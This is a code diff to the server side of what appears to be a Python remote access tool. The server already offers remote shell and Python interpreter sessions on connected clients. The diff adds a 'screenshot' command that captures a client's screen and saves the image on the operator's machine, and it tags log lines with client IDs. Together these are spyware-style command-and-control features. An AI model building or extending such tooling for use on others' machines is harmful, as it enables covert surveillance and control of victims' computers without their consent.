@@ -2,6 +2,7 @@ import os
 import socket
 import platform
 import logging
+from datetime import datetime
 
 from cryptography import x509
 from cryptography.hazmat.primitives.asymmetric import ec
@@ -32,6 +33,7 @@ Available commands:
 
 shell
 python
+screenshot
 exit/back
 """
 
@@ -122,6 +124,8 @@ class ServerCLI(BaseServer):
                 self.shell_cli(client)
             case 'python':
                 self.python_cli(client)
+            case 'screenshot':
+                self.screenshot(client)
             case _:
                 print('Command was not recognized, type "help" for help.')
 
@@ -133,7 +137,7 @@ class ServerCLI(BaseServer):
 
     def shell_cli(self, client: Client) -> None:
         """ Open a shell to client """
-        logging.debug('Launched shell')
+        logging.debug('Launched shell (%s)' % client.id)
         while True:
             command = input('shell> ')
 
@@ -172,7 +176,7 @@ class ServerCLI(BaseServer):
 
     def python_cli(self, client: Client) -> None:
         """ Open a python interpreter to client """
-        logging.debug('Launched python interpreter')
+        logging.debug('Launched python interpreter (%s)' % client.id)
         while True:
             command = input('>>> ')
 
@@ -193,6 +197,23 @@ class ServerCLI(BaseServer):
             finally:
                 client.conn.settimeout(socket.getdefaulttimeout())
 
+    def screenshot(self, client: Client) -> None:
+        """ Take a screenshot and save it in a file """
+        logging.debug('Taking screenshot (%s)' % client.id)
+        client.write(b'SCREENSHOT')
+        img_data = client.read()
+
+        if img_data.startswith(b'ERROR'):
+            logging.error('Error taking screenshot (%s): %s' % (client.id, img_data.decode()))
+            print(f'Error taking screenshot: {img_data.decode()}')
+            return
+
+        file_name = 'screenshot' + str(datetime.now()).replace(':', '-') + '.png'
+        with open(file_name, 'wb') as file:
+            file.write(img_data)
+        logging.info('Saved screenshot at (%s): %s' % (client.id, file_name))
+        print(f'Saved screenshot: {file_name}')
+            
 
 if __name__ == '__main__':
 
